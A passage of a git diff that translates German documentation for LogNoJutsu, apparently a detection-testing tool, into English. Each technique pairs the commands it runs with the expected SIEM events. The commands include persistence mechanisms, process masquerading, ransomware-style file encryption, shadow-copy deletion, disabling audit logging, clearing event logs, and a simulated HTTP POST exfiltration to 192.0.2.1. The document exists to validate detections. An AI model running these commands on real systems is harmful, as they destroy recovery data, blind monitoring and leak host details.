-**Warum das Angreifer tun:** Scheduled Tasks sind persistenter als Run-Keys, da sie auch unter anderen Benutzerkontexten ausgeführt werden können. Das `Hidden`-Flag ist eine Standard-Angreifer-Technik. Event 4698 ist das direkte Erkennungssignal.
+**Why attackers do this:** Scheduled tasks are more persistent than run keys, as they can also execute under different user contexts. The `Hidden` flag is a standard attacker technique. Event 4698 is the direct detection signal.
 
-**Erwartete SIEM-Events:**
-- `4698` — "A scheduled task was created" im Security-Log
-- `4688` — `schtasks.exe` Prozesserstellung
+**Expected SIEM Events:**
+- `4698` — "A scheduled task was created" in the Security log
+- `4688` — `schtasks.exe` process creation
 
 ---
 
 #### T1543.003 — Create Windows Service
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1543.003](https://attack.mitre.org/techniques/T1543/003/) |
-| Taktik | Persistence |
-| Exabeam-Regeln | 38 |
-| Admin erforderlich | **Ja** |
-| Cleanup | **Ja** — Service wird gelöscht |
+| Tactic | Persistence |
+| Exabeam Rules | 38 |
+| Admin Required | **Yes** |
+| Cleanup | **Yes** — Service is deleted |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
-Service-Name:    LogNoJutsuTestSvc
-Display-Name:    LogNoJutsu Test Service
-Binary-Pfad:     C:\Windows\System32\notepad.exe
-Start-Typ:       Manuell (demand)
+Service Name:    LogNoJutsuTestSvc
+Display Name:    LogNoJutsu Test Service
+Binary Path:     C:\Windows\System32\notepad.exe
+Start Type:      Manual (demand)
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```cmd
 sc.exe create LogNoJutsuTestSvc binPath= "C:\Windows\System32\notepad.exe" ^
@@ -1399,25 +1398,25 @@ sc.exe create LogNoJutsuTestSvc binPath= "C:\Windows\System32\notepad.exe" ^
 sc.exe delete LogNoJutsuTestSvc
 ```
 
-**Warum das Angreifer tun:** Malware-Services überleben Reboots und laufen typischerweise als SYSTEM. Die Kombination aus Event 7045 (Service installed) und einem unbekannten Binary-Pfad ist ein starkes Exabeam-Signal. APTs wie Cobalt Strike und Empire nutzen Service-Installation als primären Persistence-Mechanismus.
+**Why attackers do this:** Malware services survive reboots and typically run as SYSTEM. The combination of Event 7045 (Service installed) and an unknown binary path is a strong Exabeam signal. APTs like Cobalt Strike and Empire use service installation as the primary persistence mechanism.
 
-**Erwartete SIEM-Events:**
-- `7045` — "A new service was installed" im System-Log
-- `4697` — "A service was installed" im Security-Log
+**Expected SIEM Events:**
+- `7045` — "A new service was installed" in the System log
+- `4697` — "A service was installed" in the Security log
 
 ---
 
 #### T1197 — BITS Jobs Persistence
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1197](https://attack.mitre.org/techniques/T1197/) |
-| Taktik | Persistence, Defense Evasion |
-| Exabeam-Regeln | 6 |
-| Admin erforderlich | Nein |
-| Cleanup | **Ja** — BITS-Job wird abgebrochen |
+| Tactic | Persistence, Defense Evasion |
+| Exabeam Rules | 6 |
+| Admin Required | No |
+| Cleanup | **Yes** — BITS job is cancelled |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```cmd
 bitsadmin /create LogNoJutsu_BITS_Test
@@ -1431,26 +1430,26 @@ bitsadmin /info LogNoJutsu_BITS_Test
 bitsadmin /cancel LogNoJutsu_BITS_Test
 ```
 
-**Warum das Angreifer tun:** BITS (Background Intelligent Transfer Service) ist ein legitimer Windows-Service für Dateiübertragungen. Angreifer missbrauchen ihn für stealthy Downloads und Persistence via Notification-Commands. BITS-Jobs überleben Reboots, laufen als Systemservice, und werden von vielen AV-Lösungen nicht überwacht. Erkennungsevents befinden sich im `Microsoft-Windows-Bits-Client/Operational` Log — viele SIEMs ignorieren diese Quelle.
+**Why attackers do this:** BITS (Background Intelligent Transfer Service) is a legitimate Windows service for file transfers. Attackers abuse it for stealthy downloads and persistence via notification commands. BITS jobs survive reboots, run as a system service, and are not monitored by many AV solutions. Detection events are in the `Microsoft-Windows-Bits-Client/Operational` log — many SIEMs ignore this source.
 
-**Erwartete SIEM-Events:**
+**Expected SIEM Events:**
 - `BITS-Client Event 3` — BITS Job created
 - `BITS-Client Event 59` — BITS Job transfer started
-- `4688` — `bitsadmin.exe` Prozesserstellung
+- `4688` — `bitsadmin.exe` process creation
 
 ---
 
 #### T1546.003 — WMI Event Subscription
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1546.003](https://attack.mitre.org/techniques/T1546/003/) |
-| Taktik | Persistence |
-| Exabeam-Regeln | 6 |
-| Admin erforderlich | **Ja** |
-| Cleanup | **Ja** — Filter, Consumer und Binding entfernt |
+| Tactic | Persistence |
+| Exabeam Rules | 6 |
+| Admin Required | **Yes** |
+| Cleanup | **Yes** — Filter, Consumer, and Binding removed |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
 WMI Filter:   LogNoJutsu_WMI_Filter  (SystemUpTime >= 200s)
@@ -1458,7 +1457,7 @@ WMI Consumer: LogNoJutsu_WMI_Consumer (cmd.exe /C echo ...)
 WMI Binding:  Filter → Consumer
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
 # WMI Event Filter (Sysmon Event 19)
@@ -1469,7 +1468,7 @@ $wmiFilter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter `
 $wmiConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer `
     -Arguments @{ Name = "LogNoJutsu_WMI_Consumer"; CommandLineTemplate = "cmd.exe /C ..." }
 
-# Filter-Consumer-Binding (Sysmon Event 21)
+# Filter-Consumer Binding (Sysmon Event 21)
 Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
     -Arguments @{ Filter = $wmiFilter; Consumer = $wmiConsumer }
 ```
@@ -1477,86 +1476,86 @@ Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding `
 **Cleanup:**
 
 ```powershell
-# Binding, Consumer und Filter entfernen
+# Remove Binding, Consumer, and Filter
 Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject
 Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Remove-WmiObject
 Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject
 ```
 
-**Warum das Angreifer tun:** WMI Event Subscriptions sind eine der stealth-fähigsten Persistence-Mechanismen auf Windows. Sie existieren ausschließlich in der WMI-Datenbank, nicht als Dateien oder Registry-Einträge. APTs wie APT29 (Cozy Bear) nutzen diese Technik intensiv. Sysmon Events 19/20/21 sind die einzige zuverlässige Erkennungsquelle.
+**Why attackers do this:** WMI Event Subscriptions are one of the stealthiest persistence mechanisms on Windows. They exist exclusively in the WMI database, not as files or registry entries. APTs like APT29 (Cozy Bear) use this technique extensively. Sysmon Events 19/20/21 are the only reliable detection source.
 
-**Erwartete SIEM-Events:**
+**Expected SIEM Events:**
 - `Sysmon 19` — WmiEvent (EventFilter created)
 - `Sysmon 20` — WmiEvent (EventConsumer created)
-- `Sysmon 21` — WmiEvent (Filter-Consumer-Binding) — **Trifecta = Sicherer IOC**
+- `Sysmon 21` — WmiEvent (Filter-Consumer-Binding) — **Trifecta = definitive IOC**
 
 ---
 
 #### T1021.001 — Remote Desktop Protocol
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1021.001](https://attack.mitre.org/techniques/T1021/001/) |
-| Taktik | Lateral Movement |
-| Exabeam-Regeln | 6 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Tactic | Lateral Movement |
+| Exabeam Rules | 6 |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# RDP-Status prüfen (Registry-Lese-Zugriff)
+# Check RDP status (registry read access)
 Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections"
 
-# Aktive RDP-Sessions abfragen
+# Query active RDP sessions
 query session
 
-# 5 fehlgeschlagene RDP-Authentifizierungsversuche
+# 5 failed RDP authentication attempts
 1..5 | ForEach-Object {
     $ctx.ValidateCredentials("rdp_target_$_", "WrongRDPPass$_!")
     Start-Sleep -Milliseconds 500
 }
 ```
 
-**Warum das Angreifer tun:** RDP ist der am häufigsten für Lateral Movement genutzte Windows-Protokoll. Event 4624 Typ 10 (Remote Interactive) ist der spezifische Logon-Typ für RDP. Fehlgeschlagene RDP-Versuche (4625) in Kombination mit dem Quell-Host sind ein Schlüsselindikator für RDP-Brute-Force.
+**Why attackers do this:** RDP is the most commonly used Windows protocol for lateral movement. Event 4624 Type 10 (Remote Interactive) is the specific logon type for RDP. Failed RDP attempts (4625) in combination with the source host are a key indicator for RDP brute force.
 
-**Erwartete SIEM-Events:**
-- `4625` × 5 — Fehlgeschlagene Anmeldungen mit RDP-Kontext
-- `4624` Typ 10 — Remote Interactive Logon (echte RDP-Sessions)
-- `Sysmon 1` — `query.exe` Prozesserstellung
+**Expected SIEM Events:**
+- `4625` × 5 — Failed logons with RDP context
+- `4624` Type 10 — Remote Interactive Logon (real RDP sessions)
+- `Sysmon 1` — `query.exe` process creation
 
 ---
 
 #### T1036.005 — Process Masquerading
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1036.005](https://attack.mitre.org/techniques/T1036/005/) |
-| Taktik | Defense Evasion |
-| Exabeam-Regeln | 27 |
-| Admin erforderlich | Nein |
-| Cleanup | **Ja** — Temporäre Dateien werden entfernt |
+| Tactic | Defense Evasion |
+| Exabeam Rules | 27 |
+| Admin Required | No |
+| Cleanup | **Yes** — Temporary files are removed |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
-%TEMP%\LogNoJutsu_Masq\svchost.exe       (Kopie von cmd.exe)
-%TEMP%\LogNoJutsu_Masq\explorer.exe      (Kopie von powershell.exe)
-%TEMP%\LogNoJutsu_Masq\invoice_Q4.pdf.exe (Double-Extension)
+%TEMP%\LogNoJutsu_Masq\svchost.exe       (copy of cmd.exe)
+%TEMP%\LogNoJutsu_Masq\explorer.exe      (copy of powershell.exe)
+%TEMP%\LogNoJutsu_Masq\invoice_Q4.pdf.exe (double extension)
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# cmd.exe als svchost.exe aus Temp-Verzeichnis ausführen
+# Run cmd.exe as svchost.exe from Temp directory
 Copy-Item "C:\Windows\System32\cmd.exe" -Destination "$tempDir\svchost.exe"
 Start-Process "$tempDir\svchost.exe" -ArgumentList "/C echo Masquerade-svchost"
 
-# PowerShell als explorer.exe
+# PowerShell as explorer.exe
 Copy-Item "powershell.exe" -Destination "$tempDir\explorer.exe"
 Start-Process "$tempDir\explorer.exe" -ArgumentList "-Command ..."
 
-# Double-Extension Datei
+# Double-extension file
 Copy-Item "cmd.exe" -Destination "$tempDir\invoice_Q4_2024.pdf.exe"
 ```
 
@@ -1566,44 +1565,44 @@ Copy-Item "cmd.exe" -Destination "$tempDir\invoice_Q4_2024.pdf.exe"
 Remove-Item "$env:TEMP\LogNoJutsu_Masq" -Recurse -Force
 ```
 
-**Warum das Angreifer tun:** Prozess-Masquerading täuscht Security-Tools und SOC-Analysten durch vertraute Prozessnamen. Exabeam und andere SIEM-Lösungen erkennen dies durch Vergleich des Prozessnamens mit dem Ausführungspfad. `svchost.exe` außerhalb von `C:\Windows\System32\` ist ein sofortiger IOC.
+**Why attackers do this:** Process masquerading deceives security tools and SOC analysts through familiar process names. Exabeam and other SIEM solutions detect this by comparing the process name with the execution path. `svchost.exe` outside of `C:\Windows\System32\` is an immediate IOC.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 1` — Prozess mit bekanntem Windows-Namen aus unbekanntem Pfad
-- `Sysmon 11` — FileCreate für kopierte Binärdateien
-- `4688` — Prozesserstellung mit Pfad-/Name-Mismatch
+**Expected SIEM Events:**
+- `Sysmon 1` — Process with known Windows name from unknown path
+- `Sysmon 11` — FileCreate for copied binaries
+- `4688` — Process creation with path/name mismatch
 
 ---
 
 #### T1486 — Data Encrypted for Impact (Ransomware Simulation)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1486](https://attack.mitre.org/techniques/T1486/) |
-| Taktik | Impact |
-| Exabeam-Regeln | 3 |
-| Admin erforderlich | Nein |
-| Cleanup | **Ja** — Simulation-Verzeichnis vollständig entfernt |
+| Tactic | Impact |
+| Exabeam Rules | 3 |
+| Admin Required | No |
+| Cleanup | **Yes** — Simulation directory completely removed |
 
-**Was wird angelegt:**
+**What is created:**
 
 ```
 %TEMP%\LNJ_T1486\
-  ├── document_1.txt.locked  (AES-256 verschlüsselt)
+  ├── document_1.txt.locked  (AES-256 encrypted)
   ├── document_2.txt.locked
-  ├── ...  (18 Dateien, .txt / .docx / .xml)
-  └── README_DECRYPT.txt     (Ransom-Note)
+  ├── ...  (18 files, .txt / .docx / .xml)
+  └── README_DECRYPT.txt     (Ransom note)
 ```
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Testdateien erstellen (Sysmon EID 11 — Mass FileCreate)
+# Create test files (Sysmon EID 11 — Mass FileCreate)
 1..10 | ForEach-Object { "Document content $_" | Out-File "$testDir\document_$_.txt" }
 1..5  | ForEach-Object { "Spreadsheet data $_" | Out-File "$testDir\report_$_.docx"  }
 1..3  | ForEach-Object { "Config data $_"      | Out-File "$testDir\config_$_.xml"   }
 
-# AES-256 via .NET RNGCryptoServiceProvider — exaktes Ransomware-Muster (keine externen Tools)
+# AES-256 via .NET RNGCryptoServiceProvider — exact ransomware pattern (no external tools)
 $key = New-Object byte[] 32
 (New-Object System.Security.Cryptography.RNGCryptoServiceProvider).GetBytes($key)
 Get-ChildItem -Path $testDir -File | ForEach-Object {
@@ -1612,10 +1611,10 @@ Get-ChildItem -Path $testDir -File | ForEach-Object {
     $inBytes  = [System.IO.File]::ReadAllBytes($_.FullName)
     $outBytes = $aes.CreateEncryptor().TransformFinalBlock($inBytes, 0, $inBytes.Length)
     [System.IO.File]::WriteAllBytes($_.FullName + ".locked", $outBytes)
-    Remove-Item $_.FullName   # Original-Datei löschen — Sysmon EID 23 (FileDelete)
+    Remove-Item $_.FullName   # Delete original file — Sysmon EID 23 (FileDelete)
 }
 
-# Ransom-Note erstellen (Sysmon EID 11)
+# Create ransom note (Sysmon EID 11)
 "YOUR FILES HAVE BEEN ENCRYPTED BY LOGNOJUTSU SIMULATION..." | Out-File "$testDir\README_DECRYPT.txt"
 ```
 
@@ -1625,183 +1624,183 @@ Get-ChildItem -Path $testDir -File | ForEach-Object {
 Remove-Item "$env:TEMP\LNJ_T1486" -Recurse -Force
 ```
 
-**Warum das Angreifer tun:** Ransomware erzeugt einen charakteristischen "File-Churn"-Burst: Massen-FileCreate (neue `.locked`-Dateien) + Massen-FileDelete (Original-Dateien) in kurzer Zeit, gefolgt von einer Ransom-Note-Erstellung. Dieses Muster wird von behavioralen EDR-Lösungen und Exabeam (EID Sysmon 11/23) erkannt. Die echte AES-256-Verschlüsselung via `.NET` erzeugt dieselben ScriptBlock-Log-Einträge (EID 4104) wie reale Malware — nur innerhalb des sicheren `%TEMP%`-Testverzeichnisses.
+**Why attackers do this:** Ransomware generates a characteristic "file churn" burst: mass FileCreate (new `.locked` files) + mass FileDelete (original files) in a short time, followed by a ransom note creation. This pattern is recognized by behavioral EDR solutions and Exabeam (EID Sysmon 11/23). The real AES-256 encryption via `.NET` generates the same ScriptBlock log entries (EID 4104) as real malware — only within the safe `%TEMP%` test directory.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 11` — FileCreate-Burst: 18 `.locked`-Dateien + Ransom-Note
-- `Sysmon 23` — FileDelete-Burst: 18 Original-Dateien gelöscht
+**Expected SIEM Events:**
+- `Sysmon 11` — FileCreate burst: 18 `.locked` files + ransom note
+- `Sysmon 23` — FileDelete burst: 18 original files deleted
 - `4104` — ScriptBlock: `RNGCryptoServiceProvider`, `CreateEncryptor`, `TransformFinalBlock`
-- `Windows Defender EID 1116/1117` — Behavioral Ransomware Detection (kann triggern)
+- `Windows Defender EID 1116/1117` — Behavioral Ransomware Detection (may trigger)
 
 ---
 
 #### T1490 — Inhibit System Recovery
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1490](https://attack.mitre.org/techniques/T1490/) |
-| Taktik | Impact |
-| Exabeam-Regeln | 6 |
-| Admin erforderlich | **Ja** |
-| Cleanup | **Ja** — Boot-Recovery wiederhergestellt, SystemRestore-Keys entfernt |
+| Tactic | Impact |
+| Exabeam Rules | 6 |
+| Admin Required | **Yes** |
+| Cleanup | **Yes** — Boot recovery restored, SystemRestore keys removed |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: Boot-Recovery deaktivieren (EID 4688 für bcdedit.exe)
+# Step 1: Disable boot recovery (EID 4688 for bcdedit.exe)
 bcdedit.exe /set "{default}" bootstatuspolicy ignoreallfailures
 bcdedit.exe /set "{default}" recoveryenabled no
 
-# Step 2: vssadmin delete shadows — #1 Ransomware-Indikator (standalone Tier-1 SIEM-Alert)
+# Step 2: vssadmin delete shadows — #1 ransomware indicator (standalone Tier-1 SIEM alert)
 vssadmin.exe delete shadows /all /quiet
 
-# Step 3: WMI Shadow Copy Delete (redundante Methode, die echte Ransomware nutzt)
+# Step 3: WMI Shadow Copy Delete (redundant method used by real ransomware)
 wmic.exe shadowcopy delete
 
-# Step 4: Backup Catalog löschen
+# Step 4: Delete backup catalog
 wbadmin.exe delete catalog -quiet
 
-# Step 5: System Restore Registry-Disable (Sysmon EID 13)
+# Step 5: System Restore registry disable (Sysmon EID 13)
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableConfig /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v DisableSR /t REG_DWORD /d 1 /f
 ```
 
-**Cleanup:** `bcdedit /set recoveryenabled yes` + Registry-Keys entfernt
+**Cleanup:** `bcdedit /set recoveryenabled yes` + registry keys removed
 
-**Warum das Angreifer tun:** Das Löschen von Volume Shadow Copies und Deaktivierung der Windows-Wiederherstellung verhindert, dass Opfer ihre Daten ohne Lösegeld wiederherstellen können — die klassische Ransomware-Pre-Encryption-Sequenz (Ryuk, LockBit, BlackMatter). `vssadmin delete shadows /all /quiet` ist ein standalone Tier-1 SIEM-Alert in Exabeam als "Disable Windows recovery mode" Correlation Rule.
+**Why attackers do this:** Deleting Volume Shadow Copies and disabling Windows recovery prevents victims from restoring their data without paying a ransom — the classic ransomware pre-encryption sequence (Ryuk, LockBit, BlackMatter). `vssadmin delete shadows /all /quiet` is a standalone Tier-1 SIEM alert in Exabeam as a "Disable Windows recovery mode" correlation rule.
 
-**Erwartete SIEM-Events:**
-- `4688` — `bcdedit.exe /set recoveryenabled no` — **Boot-Recovery-Deaktivierung**
-- `4688` — `vssadmin.exe delete shadows /all /quiet` — **Standalone Tier-1 SIEM-Alert**
+**Expected SIEM Events:**
+- `4688` — `bcdedit.exe /set recoveryenabled no` — **boot recovery deactivation**
+- `4688` — `vssadmin.exe delete shadows /all /quiet` — **standalone Tier-1 SIEM alert**
 - `4688` — `wmic.exe shadowcopy delete`
 - `4688` — `wbadmin.exe delete catalog`
-- `Sysmon 13` — RegistryValueSet: SystemRestore-Disable-Keys
+- `Sysmon 13` — RegistryValueSet: SystemRestore disable keys
 - `System EID 7036` — Volume Shadow Copy Service state change
 
 ---
 
 #### T1562.002 — Disable Windows Event Logging
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1562.002](https://attack.mitre.org/techniques/T1562/002/) |
-| Taktik | Defense Evasion |
-| Exabeam-Regeln | 3 |
-| Admin erforderlich | **Ja** |
-| Cleanup | **Ja** — Auditierung wird wiederhergestellt |
+| Tactic | Defense Evasion |
+| Exabeam Rules | 3 |
+| Admin Required | **Yes** |
+| Cleanup | **Yes** — Auditing is restored |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Step 1: auditpol backup + kategoriewise deaktivieren (EID 4719 pro Änderung)
+# Step 1: auditpol backup + category-wise disable (EID 4719 per change)
 auditpol /backup /file:"$env:TEMP\lnj_auditpol_backup.csv"
 auditpol /set /subcategory:"Logon" /success:disable /failure:disable
 auditpol /set /subcategory:"Process Creation" /success:disable
 
-# Step 2: wevtutil Kanal-Deaktivierung (Sysmon und PS-Log)
+# Step 2: wevtutil channel deactivation (Sysmon and PS log)
 wevtutil sl "Microsoft-Windows-Sysmon/Operational" /e:false
 wevtutil sl "Microsoft-Windows-PowerShell/Operational" /e:false
 
-# Step 3: Registry MaxSize auf 1 MB reduzieren (silencer für Log-Rotation)
+# Step 3: Registry MaxSize reduction to 1 MB (silencer for log rotation)
 reg add "HKLM\SYSTEM\CurrentControlSet\Services\EventLog\Security" /v MaxSize /t REG_DWORD /d 0x100000 /f
 ```
 
-**Cleanup:** `auditpol /restore /file:backup.csv` + wevtutil re-enable + Registry-Wert entfernt
+**Cleanup:** `auditpol /restore /file:backup.csv` + wevtutil re-enable + registry value removed
 
-**Warum das Angreifer tun:** Durch mehrstufige Logging-Deaktivierung werden EID 4624/4625 (Logon-Events), EID 4688 (Prozesserstellung) und Sysmon-Events für nachfolgende Aktionen unterdrückt. Event 4719 ("System audit policy was changed") ist das Erkennungssignal — es feuert für jede `auditpol`-Änderung. Die wevtutil-Kanal-Deaktivierung testet, ob das SIEM fehlende Logs bemerkt.
+**Why attackers do this:** Through multi-stage logging deactivation, EID 4624/4625 (logon events), EID 4688 (process creation), and Sysmon events for subsequent actions are suppressed. Event 4719 ("System audit policy was changed") is the detection signal — it fires for every `auditpol` change. The wevtutil channel deactivation tests whether the SIEM notices missing logs.
 
-**Erwartete SIEM-Events:**
-- `4719` — "System audit policy was changed" — **für jede auditpol-Subcategory-Änderung**
-- `4688` — `auditpol.exe`, `wevtutil.exe` Prozesserstellung
-- `Sysmon 13` — RegistryValueSet: EventLog MaxSize-Reduktion
+**Expected SIEM Events:**
+- `4719` — "System audit policy was changed" — **for every auditpol subcategory change**
+- `4688` — `auditpol.exe`, `wevtutil.exe` process creation
+- `Sysmon 13` — RegistryValueSet: EventLog MaxSize reduction
 
 ---
 
 #### T1070.001 — Clear Windows Event Logs
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1070.001](https://attack.mitre.org/techniques/T1070/001/) |
-| Taktik | Defense Evasion |
-| Exabeam-Regeln | 8 |
-| Admin erforderlich | **Ja** |
-| Cleanup | Keiner erforderlich |
+| Tactic | Defense Evasion |
+| Exabeam Rules | 8 |
+| Admin Required | **Yes** |
+| Cleanup | None required |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Method 1: wevtutil cl — kanonische Log-Löschung
+# Method 1: wevtutil cl — canonical log deletion
 wevtutil.exe cl Application          # System EID 104 (Application log cleared)
 wevtutil.exe cl "Windows PowerShell" # System EID 104 (PS log cleared)
 wevtutil.exe cl Security             # Security EID 1102 (Security log cleared)
-# Kritisch: EID 1102 wird BEVOR der Log gelöscht wird geschrieben — es überlebt immer
+# Critical: EID 1102 is written BEFORE the log is cleared — it always survives
 
-# Method 2: PowerShell Clear-EventLog (testet PS-Cmdlet-Erkennung, anders als wevtutil)
+# Method 2: PowerShell Clear-EventLog (tests PS cmdlet detection, different from wevtutil)
 Clear-EventLog -LogName "System"
 
-# Method 3: .NET EventLog.Clear() (umgeht Clear-EventLog-Cmdlet — testet Event-Log-Only-Detektion)
+# Method 3: .NET EventLog.Clear() (bypasses Clear-EventLog cmdlet — tests event-log-only detection)
 [System.Diagnostics.EventLog]::GetEventLogs() | Where-Object { $_.Log -match "Application|Setup" } | ForEach-Object { $_.Clear() }
 ```
 
-**Warum das Angreifer tun:** Nach einer Kompromittierung versuchen Angreifer, Spuren zu verwischen. `wevtutil cl Security` ist ein direkter IOC. **Entscheidend:** EID 1102 wird vom Windows-Event-System erzeugt, BEVOR der Security-Log-Inhalt tatsächlich gelöscht wird — es überlebt daher immer die Log-Löschung und ist einer der hochwertigsten Attacker-Indikatoren. Die drei Methoden (wevtutil, PS-Cmdlet, .NET-direkt) testen alle Erkennungsebenen.
+**Why attackers do this:** After a compromise, attackers try to cover their tracks. `wevtutil cl Security` is a direct IOC. **Critically:** EID 1102 is generated by the Windows event system BEFORE the Security log content is actually deleted — it therefore always survives the log deletion and is one of the highest-value attacker indicators. The three methods (wevtutil, PS cmdlet, .NET direct) test all detection levels.
 
-**Erwartete SIEM-Events:**
-- `1102` — Security Audit Log Cleared — **EID wird vor dem Clear geschrieben, überlebt immer**
+**Expected SIEM Events:**
+- `1102` — Security Audit Log Cleared — **EID is written before the clear, always survives**
 - `System 104` — Event log cleared (Application, System, Windows PowerShell)
-- `4688` — `wevtutil.exe` mit `cl`-Subkommando
-- `4104` — ScriptBlock-Log: `Clear-EventLog` und `.NET EventLog.Clear()`
+- `4688` — `wevtutil.exe` with `cl` subcommand
+- `4104` — ScriptBlock log: `Clear-EventLog` and `.NET EventLog.Clear()`
 
 ---
 
 #### T1021.002 — SMB Admin Shares (Lateral Movement)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1021.002](https://attack.mitre.org/techniques/T1021/002/) |
-| Taktik | Lateral Movement |
+| Tactic | Lateral Movement |
 | NIST 800-53 | AC-3, AC-17, SI-4 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Lokale SMB-Freigaben auflisten
+# List local SMB shares
 net share
 
 # WMI Win32_Share Enumeration (EID 4104, 4688)
 Get-WmiObject -Class Win32_Share | Select-Object Name, Path, Type
 
-# Admin-Share-Zugriff testen — erzeugt EID 5140/5145
+# Test admin share access — generates EID 5140/5145
 foreach ($share in @("C$", "IPC$", "ADMIN$")) {
     Test-Path "\\$env:COMPUTERNAME\$share" | Out-Null
 }
 ```
 
-**Warum das Angreifer tun:** SMB Admin Shares (`C$`, `ADMIN$`) sind Standardzugriffswege für laterale Bewegung in Windows-Umgebungen. Angreifer nutzen sie für Remote-Datei-Zugriff und -Ausführung. Zugriff auf `C$` ohne aktive Netzlaufwerkverbindung ist ein starkes Anomalie-Signal in UEBA-Systemen.
+**Why attackers do this:** SMB Admin Shares (`C$`, `ADMIN$`) are standard access paths for lateral movement in Windows environments. Attackers use them for remote file access and execution. Accessing `C$` without an active network drive connection is a strong anomaly signal in UEBA systems.
 
-**Erwartete SIEM-Events:**
-- `4688` — `net.exe` mit `share`
-- `5140` — Network Share Object Access (Admin-Share-Zugriff)
-- `5145` — Network Share Object Check (detaillierter Zugriffs-Check)
-- `Sysmon 3` — SMB-Verbindung (Port 445)
+**Expected SIEM Events:**
+- `4688` — `net.exe` with `share`
+- `5140` — Network Share Object Access (admin share access)
+- `5145` — Network Share Object Check (detailed access check)
+- `Sysmon 3` — SMB connection (Port 445)
 
 ---
 
 #### T1041 — Exfiltration Over C2 Channel (HTTP POST Simulation)
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
 | MITRE ATT&CK | [T1041](https://attack.mitre.org/techniques/T1041/) |
-| Taktik | Exfiltration |
+| Tactic | Exfiltration |
 | NIST 800-53 | SC-7, SI-4, AU-12 |
-| Admin erforderlich | Nein |
-| Cleanup | Keiner |
+| Admin Required | No |
+| Cleanup | None |
 
-**Was wird ausgeführt:**
+**What is executed:**
 
 ```powershell
-# Simulierter HTTP POST mit Base64-codiertem Payload an nicht-existenten Host
+# Simulated HTTP POST with Base64-encoded payload to non-existent host
 $payload = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("simulated-exfil-data"))
 $body = @{ data = $payload; host = $env:COMPUTERNAME; user = $env:USERNAME } | ConvertTo-Json
 
@@ -1809,72 +1808,72 @@ try {
     Invoke-WebRequest -Uri "http://192.0.2.1/exfil" -Method POST -Body $body `
         -ContentType "application/json" -TimeoutSec 3 -ErrorAction Stop
 } catch {
-    # Verbindungsfehler erwartet — Sysmon EID 3 (Netzwerkverbindung) trotzdem erzeugt
+    # Connection failure expected — Sysmon EID 3 (network connection) still generated
     Write-Host "[Simulation] Exfiltration attempt logged (connection failed as expected)"
 }
 ```
 
-**Warum das Angreifer tun:** HTTP POST an externe Adressen ist der häufigste Exfiltrations-Kanal. Der Verbindungsversuch erzeugt Sysmon EID 3 (NetworkConnect) unabhängig vom Verbindungsergebnis — genau das Signal, auf das SIEM-Korrelationsregeln prüfen. Base64-Encoding des Payloads ist das Standardmuster für Data Staging vor Exfiltration.
+**Why attackers do this:** HTTP POST to external addresses is the most common exfiltration channel. The connection attempt generates Sysmon EID 3 (NetworkConnect) regardless of the connection result — exactly the signal that SIEM correlation rules check for. Base64 encoding of the payload is the standard pattern for data staging before exfiltration.
 
-**Erwartete SIEM-Events:**
-- `Sysmon 3` — NetworkConnect-Event: `powershell.exe` → Port 80 an externe IP
-- `4688` — `powershell.exe` Prozesserstellung
-- `4104` — ScriptBlock: `Invoke-WebRequest` mit externem Ziel
-- `Sysmon 22` — DNS-Abfrage (falls Hostname statt IP verwendet)
+**Expected SIEM Events:**
+- `Sysmon 3` — NetworkConnect event: `powershell.exe` → Port 80 to external IP
+- `4688` — `powershell.exe` process creation
+- `4104` — ScriptBlock: `Invoke-WebRequest` with external target
+- `Sysmon 22` — DNS query (if hostname instead of IP is used)
 
 ---
 
 #### T1134.001 — Token Impersonation / Privilege Check
 
-| Eigenschaft | Wert |
+| Property | Value |
 |---|---|
